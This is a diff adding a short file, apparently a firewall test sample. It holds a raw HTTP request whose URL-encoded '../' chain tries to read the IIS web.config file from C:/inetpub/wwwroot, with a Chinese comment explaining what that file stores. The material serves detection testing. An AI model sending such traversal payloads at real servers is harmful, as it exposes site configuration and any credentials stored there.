@@ -1,0 +1,9 @@
+# 目录遍历_web.config
+# C:/inetpub/wwwroot/web.config 通常用于存储 ASP.NET 网站的配置信息。在 Windows 系统上，C:/inetpub/wwwroot/ 目录通常是默认的 IIS（Internet Information Services）网站根目录，用于存放网站的文件和资源，而 web.config 文件则是其中一个关键的配置文件。
+GET /?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FC:%2Finetpub%2Fwwwroot%2Fweb.config&bid=hd_tag_m8mv23sx HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23sx
+RM-PRO-Token: 2509c91ca2e41b76fcb026ccbbb7e2d4
+RM-PRO-Time: 1742808342908
+User-Agent: curl/7.83.1
+
